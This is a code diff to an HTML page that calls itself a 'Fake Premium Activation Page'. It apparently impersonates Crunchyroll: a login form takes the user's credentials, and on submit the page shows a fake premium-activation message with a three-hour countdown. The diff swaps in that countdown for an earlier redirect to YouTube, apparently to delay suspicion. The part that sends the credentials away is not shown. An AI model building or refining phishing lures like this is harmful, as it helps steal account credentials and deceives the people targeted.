@@ -133,6 +133,11 @@
         .premium-container {
             display: none;
         }
+        .countdown {
+            font-size: 18px;
+            color: #ff7f00;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -166,12 +171,12 @@
         <div class="loader" id="loader"></div>
     </div>
 
-    <!-- Fake Premium Page -->
+    <!-- Fake Premium Activation Page -->
     <div class="premium-container" id="premiumPage">
-        <h2>Premium Unlocked!</h2>
-        <p>You now have access to exclusive content.</p>
-        <div class="loader"></div>
-        <p>Redirecting to YouTube...</p>
+        <h2>Premium Activation</h2>
+        <p>Your premium access will be activated in:</p>
+        <div class="countdown" id="countdown">03:00:00</div>
+        <p>Thank you for choosing Crunchyroll! Sit back and relax while we process your request.</p>
     </div>
 
     <script>
@@ -180,6 +185,7 @@
         const form = document.getElementById('loginForm');
         const errorDiv = document.getElementById('error');
         const loader = document.getElementById('loader');
+        const countdown = document.getElementById('countdown');
 
         form.addEventListener('submit', async (event) => {
             event.preventDefault();
@@ -211,10 +217,21 @@
                         loginPage.style.display = 'none';
                         premiumPage.style.display = 'block';
 
-                        // Redirect to YouTube after 5 seconds
-                        setTimeout(() => {
-                            window.location.href = 'https://www.youtube.com';
-                        }, 5000);
+                        // Start countdown
+                        let timeLeft = 3 * 60 * 60; // 3 hours in seconds
+                        const timer = setInterval(() => {
+                            const hours = Math.floor(timeLeft / 3600);
+                            const minutes = Math.floor((timeLeft % 3600) / 60);
+                            const seconds = timeLeft % 60;
+                            countdown.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+
+                            if (timeLeft <= 0) {
+                                clearInterval(timer);
+                                countdown.textContent = 'Premium Activated!';
+                            } else {
+                                timeLeft--;
+                            }
+                        }, 1000);
                     }, 2000);
                 } else {
                     errorDiv.textContent = 'Login failed. Please try again.';
